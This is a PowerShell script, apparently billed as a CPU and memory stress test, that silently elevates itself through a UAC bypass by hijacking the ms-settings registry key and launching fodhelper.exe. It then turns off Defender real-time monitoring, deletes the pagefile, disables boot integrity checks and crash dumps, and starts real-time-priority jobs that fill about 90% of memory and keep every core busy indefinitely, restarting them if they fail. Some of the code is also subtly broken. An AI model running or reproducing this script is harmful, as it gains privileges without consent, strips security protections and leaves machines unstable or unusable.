# Self-elevate silently via UAC bypass
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

Import-Module ThreadJob -Force
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}

# --- System Tweaks ---
Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT

# --- Resource Parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetMem = [math]::Floor($physicalMem * 0.9)
$numCores = [Environment]::ProcessorCount
$numThreadsPerTask = 3  # Threads per CPU-intensive task
$jobs = [System.Collections.ArrayList]::new()

# --- Core Job Definition ---
$coreJobScript = {
    param($coreId, $numThreads, $minChunk, $maxChunk, $targetMem)
    
    # Process Priority Management
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
    $proc.ProcessorAffinity = [math]::Pow(2, $coreId)  # Bind to specific core

    # Memory Stressor
    $memChunks = [System.Collections.Generic.List[byte[]]]::new()
    Start-ThreadJob -ThrottleLimit $numThreads -ScriptBlock {
        param($min, $max, $target)
        $allocated = 0
        while ($allocated -lt $target) {
            $chunkSize = Get-Random -Minimum $min -Maximum $max
            try {
                $chunk = [byte[]]::new($chunkSize)
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
            } catch { Start-Sleep -Milliseconds 100 }
        }
    } -ArgumentList $minChunk, $maxChunk, ($targetMem/$numCores) | Out-Null

    # CPU Stressors
    1..$numThreads | ForEach-Object {
        # SHA512 Hashing Thread
        Start-ThreadJob -ThrottleLimit $numThreads -ScriptBlock {
            $data = [byte[]]::new(8192)
            $hasher = [System.Security.Cryptography.SHA512]::Create()
            while ($true) {
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
                1..1000 | ForEach-Object { $data = $hasher.ComputeHash($data) }
            }
        }

        # Prime Factorization Thread
        Start-ThreadJob -ThrottleLimit $numThreads -ScriptBlock {
            while ($true) {
                $n = Get-Random -Minimum 1e12 -Maximum 1e18
                for ($i=2; $i -le [math]::Sqrt($n); $i++) {
                    while ($n % $i -eq 0) { $n /= $i }
                }
            }
        }

        # Matrix Multiplication Thread (realistic size)
        Start-ThreadJob -ThrottleLimit $numThreads -ScriptBlock {
            $size = 512  # Reduced for continuous operation
            $A = 1..$size | ForEach-Object { ,@(1..$size | ForEach-Object { Get-Random }) }
            $B = 1..$size | ForEach-Object { ,@(1..$size | ForEach-Object { Get-Random }) }
            while ($true) {
                $C = foreach ($i in 0..($size-1)) {
                    foreach ($j in 0..($size-1)) {
                        0..($size-1) | ForEach-Object -Begin { $sum = 0 } -Process { $sum += $A[$i][$_] * $B[$_][$j] } -End { $sum }
                    }
                }
            }
        }
    }

    # Keep job alive indefinitely
    while ($true) { Start-Sleep -Seconds 3600 }
}

# --- Start Core Jobs ---
1..$numCores | ForEach-Object {
    $job = Start-ThreadJob -ScriptBlock $coreJobScript -ArgumentList $_, $numThreadsPerTask, 700MB, 1.5GB, $targetMem
    $job | Add-Member -NotePropertyName Retries -NotePropertyValue 0
    $jobs.Add($job) | Out-Null
}

# --- Job Monitoring System ---
while ($true) {
    $activeJobs = $jobs.ToArray()
    $activeJobs | ForEach-Object {
        if ($_.State -ne 'Running') {
            Write-Warning "Core job $($_.Id) failed. Retry count: $($_.Retries)"
            if ($_.Retries -lt 3) {
                $newJob = Start-ThreadJob -ScriptBlock $coreJobScript -ArgumentList $_.Id, $numThreadsPerTask, 700MB, 1.5GB, $targetMem
                $newJob | Add-Member -NotePropertyName Retries -NotePropertyValue ($_.Retries + 1)
                $jobs.Remove($_) | Out-Null
                $jobs.Add($newJob) | Out-Null
            } else {
                Write-Error "Core job $($_.Id) failed permanently after 3 retries"
                $jobs.Remove($_) | Out-Null
            }
        }
    }
    Start-Sleep -Seconds 10
}
